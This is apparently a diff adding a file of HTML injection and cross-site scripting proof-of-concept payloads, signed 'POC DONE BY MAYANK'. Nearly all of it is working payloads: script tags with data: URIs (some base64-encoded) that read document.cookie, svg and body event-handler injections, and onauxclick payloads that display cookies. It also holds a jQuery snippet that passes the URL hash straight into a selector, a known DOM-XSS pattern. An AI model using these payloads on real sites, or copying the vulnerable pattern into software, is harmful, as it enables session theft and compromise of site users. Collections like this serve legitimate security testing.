@@ -1,0 +1,48 @@
+<!DOCTYPE html> 
+<html>   
+<head>   
+<title>HTML marquee Tag</title>  
+</head>
+<body>    
+<marquee>HTML INJECTION POC DONE BY MAYANK </marquee>  
+</body>  
+</html>
+document).ready(function() {
+  var x = (window.location.hash.match(/^#([^\/].+)$/) || [])[1];
+  var w = $(‘a[name=”‘ + x + ‘”], [id=”‘ + x + ‘”]’);
+});
+<h1>Hello,<script>alert(1)</script>!</h1>
+<script src="data:text/html;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="></script>
+<script src=data:text/html;base64,YWxlcnQoZG9jdW1lbnQuY29va2llKQ==></script>
+<script src=data:text/html;,alert(document.cookie)></script>
+<script src=data:text/html,alert(document.cookie)></script>
+<script src=data:,alert(document.cookie)></script>
+<script src="data:text/html;base64,YWxlcnQoMSk="></script>
+<script src=data:text/html;base64,YWxlcnQoMSk=></script>
+<script src=data:text/html;,alert(1)></script>
+<script src=data:text/html,alert(1)></script>
+<script src=data:,alert(1)></script>
+<body><svg><x><script>alert(1)</script></x></svg></body>
+<svg><x><script>alert(1)</x>
+<svg><a><script>alert(1)</a>
+<svg onload=alert`1`>
+<svg onload=alert(1)>
+<svg onload=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)><a href=#x>click this!#x
+<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x
+<body onscroll=alert(1)><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><br><br><br><br>
+<br><br><br><br><br><br><x id=x>#x
+<body onresize=alert(1)>press F12!
+<body onhelp=alert(1)>press F1! (MSIE)
+<h1\style="color:blue">here</h1>
+<iframe\src='https://www.bing.com'>
+"><svg height="1000" width="1000" onauxclick=confirm`12233`> <circle cx="500" cy="500" r="400" stroke="black" stroke-width="3" fill="red" /> </svg>
+"><details onauxclick=x=prompt,x`${document.cookie}`></details>
+"><marquee+width=1000+onauxclick=confirm(document.cookie)>XSS</marquee>
+<iframe src=https://i.guim.co.uk/img/media/fe1e34da640c5c56ed16f76ce6f994fa9343d09d/0_174_3408_2046/master/3408.jpg?width=1200&height=900&quality=85&auto=format&fit=crop&s=0d3f33fb6aa6e0154b7713a00454c83d>
